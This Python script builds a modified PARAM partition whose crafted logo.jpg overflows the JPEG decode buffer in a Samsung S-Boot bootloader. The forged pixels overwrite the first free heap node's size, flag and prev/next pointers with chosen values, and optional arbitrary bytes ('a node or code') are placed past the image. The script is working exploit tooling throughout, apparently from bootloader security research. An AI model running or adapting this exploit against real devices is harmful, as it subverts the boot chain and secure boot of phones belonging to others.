#!/usr/bin/env python3

# SPDX-License-Identifier: MIT
# Copyright (c) 2026 elkir0

"""Build a PARAM whose logo.jpg overflows the decode buffer onto the DRAM heap's first node only.

    venv/bin/python -I scripts/build_b0.py STOCK_PARAM OUT_PARAM --size 0x1ffff0 [--flag 1]
                    [--prev 0x23ec1048] [--next 0x23ec1048] [--width 16378] [--height 264]
                    [--tail ADDRESS=HEX ...] [--out-jpeg FILE] [--no-next-search]

S-Boot's JPEG library allocates from its own heap inside the image; nothing lives in the DRAM
heap (0x24F00000) when the logo is decoded but its one free node B0 {size, free byte, prev,
next}. This image is black everywhere except B0's 16 bytes, so B0 is the only thing changed.
`--next` is a file-buffer address: if its bytes make a pixel that no JPEG gives exactly, the
next addresses upwards, 16 at a time, are tried (unless --no-next-search). --tail patches bytes
at a file-buffer address past the image, for a node or code. Past the archive the stock bytes
are kept: S-Boot stores data there.
"""

from __future__ import annotations

import argparse
import hashlib
import io
import struct
import sys
from pathlib import Path

import numpy as np
from PIL import Image

sys.path.insert(0, str(Path(__file__).resolve().parent))
import build_calib as bc  # noqa: E402
import build_hijack as bh  # noqa: E402
import jpegforge as jf  # noqa: E402


def header_row(reach: np.ndarray, width: int, size: int, flag: int, prev: int, nxt: int):
    """A black row of ``width`` pixels carrying B0's header at its exact address, or None.

    The three padding bytes after the free byte are left at zero. ``prev`` is never read by the
    allocator's walk, so 0 is the usual value: its bytes then fall on black pixels.
    """
    row, offset = divmod(bh.HEAP_FREE_BLOCK - bc.DECODE_BUFFER, (width * 3 + 3) & ~3)
    if offset % 3 != 1:
        raise SystemExit(f"width {width}: B0 starts at byte {offset % 3} of a pixel, not 1")
    data = struct.pack("<IB3xII", size, flag, prev, nxt)
    pixels = pixels_around(offset, data)
    for rgb in pixels:
        if not reach[rgb] or jf.find_ycc(rgb) is None:
            return None
    full = bytearray(width * 3)
    full[offset:offset + 16] = data
    return row, offset, bytes(full)


def pixels_around(offset: int, data: bytes) -> list[tuple[int, int, int]]:
    """The pixels touched by ``data`` written at byte ``offset`` of a black row."""
    s = b"\0" * (offset % 3) + data
    s = s.ljust(((len(s) + 2) // 3) * 3, b"\0")
    return [tuple(s[3 * i:3 * i + 3]) for i in range(len(s) // 3)]


def solve_next(reach: np.ndarray, width: int, size: int, prev: int, nxt: int, search: bool, floor: int):
    """(free byte, next address, row) with an exactly decodable header: ``nxt`` if it can be, else
    the next addresses upwards, 16 at a time (a node or code can sit at any of them)."""
    for flag in range(1, 256):
        found = header_row(reach, width, size, flag, prev, nxt)
        if found is not None:
            return flag, nxt, found
    if not search:
        return None
    cand = (max(nxt, floor) + 15) & ~15
    while cand < bh.FILE_BUFFER + bh.FILE_BUFFER_SIZE:
        for flag in (1, 0x80, 0xFF, *range(2, 256)):
            found = header_row(reach, width, size, flag, prev, cand)
            if found is not None:
                return flag, cand, found
        cand += 16
    return None


def build_jpeg(width: int, height: int, special_row: int, special: bytes) -> bytes:
    """Bands of eight identical rows; all black but the band holding ``special``."""
    if height < 8:
        raise SystemExit("height must be at least 8")
    black = [list(jf.solve_block2d((0,) * 64)) for _ in range(3)]
    cache: dict[tuple, list] = {}
    blocks = {}
    for by in range((height + 7) // 8):                 # the last band's rows above the image are never decoded
        row = special if by * 8 <= special_row < by * 8 + 8 else bytes(width * 3)
        for bx in range((width + 7) // 8):
            pixels = tuple(tuple(row[24 * bx + 3 * x:24 * bx + 3 * x + 3]) if 24 * bx + 3 * x + 3 <= len(row)
                           else (0, 0, 0) for x in range(8))
            if not any(pixels):
                blocks[(by, bx)] = black
                continue
            if pixels not in cache:
                yccs = [jf.find_ycc(p) for p in pixels]
                if not all(yccs):
                    raise SystemExit(f"block ({by}, {bx}): a pixel is not exactly representable")
                cache[pixels] = [list(jf.solve_block2d(tuple(ycc[c] for _ in range(8) for ycc in yccs))) for c in range(3)]   # row-major
            blocks[(by, bx)] = cache[pixels]
    return jf.encode_jpeg(width, height, blocks)


def verify(jpeg: bytes, width: int, height: int, special_row: int, special: bytes) -> list[str]:
    with Image.open(io.BytesIO(jpeg)) as image:
        image.load()
        if image.size != (width, height):
            return [f"decoded size {image.size}"]
        raw = image.tobytes()
    problems = []
    for r in range(height):
        want = special if r // 8 == special_row // 8 else bytes(width * 3)   # a band's eight rows are alike   # only rows inside the image
        got = raw[r * width * 3:(r + 1) * width * 3]
        if got != want:
            first = next(i for i in range(width * 3) if got[i] != want[i])
            problems.append(f"row {r}: first difference at byte {first}")
    return problems


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    parser.add_argument("stock_param", type=Path)
    parser.add_argument("out_param", type=Path)
    parser.add_argument("--width", type=lambda t: int(t, 0), default=16378)
    parser.add_argument("--height", type=lambda t: int(t, 0), default=264, help="rows, a multiple of 8 (default: the band of B0)")
    parser.add_argument("--size", type=lambda t: int(t, 0), help="B0's size field")
    parser.add_argument("--flag", type=lambda t: int(t, 0), default=None, help="B0's free byte (default: the first one that decodes)")
    parser.add_argument("--prev", type=lambda t: int(t, 0), default=0, help="never read by the walk; 0 keeps black pixels")
    parser.add_argument("--next", type=lambda t: int(t, 0), default=0x23EC1048)
    parser.add_argument("--no-next-search", action="store_true")
    parser.add_argument("--tail", action="append", default=[], help="ADDRESS=HEX: bytes at a file-buffer address past the image")
    parser.add_argument("--out-jpeg", type=Path)
    parser.add_argument("--plain", action="store_true", help="black image only, no header (needs --height)")
    args = parser.parse_args()

    reach = bc.reachability()
    stride = (args.width * 3 + 3) & ~3
    heap_row = (bh.HEAP_FREE_BLOCK - bc.DECODE_BUFFER) // stride
    if args.plain:                                   # a black image that stops above the heap: no header at all
        jpeg = build_jpeg(args.width, args.height, -1, b"")
        problems = verify(jpeg, args.width, args.height, -100, b"")
        if problems:
            print("FAIL:", problems[:3])
            return 1
        logo = bytes(jpeg)
        stock = args.stock_param.read_bytes()
        param = bytearray(bc.replace_logo(stock, logo))
        param[bh.DATA_AT:] = stock[bh.DATA_AT:]
        args.out_param.write_bytes(bytes(param))
        print(f"plain black image {args.width}x{args.height}, stride {stride}: written {bc.DECODE_BUFFER:#x}.."
              f"{bc.DECODE_BUFFER + stride * args.height:#x}, the heap at {bh.HEAP_FREE_BLOCK:#x} untouched; jpeg {len(jpeg)} bytes")
        print(f"{args.out_param}: sha256 {hashlib.sha256(bytes(param)).hexdigest()}")
        return 0
    if args.height <= heap_row:
        raise SystemExit(f"--height {args.height} stops above B0 (row {heap_row})")
    if args.flag is not None:
        found = header_row(reach, args.width, args.size, args.flag, args.prev, args.next)
        solved = (args.flag, args.next, found) if found else None
    else:
        solved = solve_next(reach, args.width, args.size, args.prev, args.next, not args.no_next_search, 0)
    if solved is None:
        print(f"FAIL: no exactly decodable header for size {args.size:#x} prev {args.prev:#x} next {args.next:#x}")
        return 1
    flag, nxt, (special_row, offset, special) = solved
    jpeg = build_jpeg(args.width, args.height, special_row, special)
    problems = verify(jpeg, args.width, args.height, special_row, special)
    for problem in problems[:10]:
        print("PROBLEM:", problem)
    if problems:
        print(f"FAIL: {len(problems)} row(s) differ after decoding")
        return 1

    logo = bytearray(jpeg)
    for tail in args.tail:
        address, hex_bytes = tail.split("=", 1)
        at = int(address, 0) - bh.FILE_BUFFER
        patch = bytes.fromhex(hex_bytes)
        if at < ((len(jpeg) + 0x1000 + 15) & ~15):
            raise SystemExit(f"tail {address} is inside or too close to the image ({len(jpeg)} bytes)")
        logo += bytes(max(0, at - len(logo)))
        logo[at:at + len(patch)] = patch
    if len(logo) > bh.FILE_BUFFER_SIZE:
        raise SystemExit("logo.jpg does not fit the file buffer")
    logo += bytes(-len(logo) % 512)          # whole 512-byte sectors: a loader that rounds down must not lose the tail
    if args.tail:
        with Image.open(io.BytesIO(bytes(logo))) as image:
            image.load()

    stock = args.stock_param.read_bytes()
    param = bytearray(bc.replace_logo(stock, bytes(logo)))
    end = max(i for i in range(0, bh.DATA_AT, 512) if any(param[i:i + 512])) + 512
    assert end + 1024 <= bh.DATA_AT, f"the archive reaches {end:#x}, into S-Boot's data"
    param[bh.DATA_AT:] = stock[bh.DATA_AT:]
    args.out_param.write_bytes(bytes(param))
    if args.out_jpeg:
        args.out_jpeg.write_bytes(bytes(logo))

    decoded = special[offset:offset + 16]
    print(f"width {args.width}, {args.height} rows, stride {stride}: written {bc.DECODE_BUFFER:#x}.."
          f"{bc.DECODE_BUFFER + stride * args.height:#x}")
    print(f"B0 {bh.HEAP_FREE_BLOCK:#010x} = row {special_row} + {offset}: {decoded.hex(' ')}  "
          f"size {struct.unpack_from('<I', decoded)[0]:#x}, free byte {decoded[4]:#04x}, "
          f"prev {struct.unpack_from('<I', decoded, 8)[0]:#010x}, next {struct.unpack_from('<I', decoded, 12)[0]:#010x}")
    print(f"jpeg {len(jpeg)} bytes, logo file {len(logo)} bytes; every row decodes exactly")
    print(f"{args.out_param}: {len(param)} bytes, sha256 {hashlib.sha256(bytes(param)).hexdigest()}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
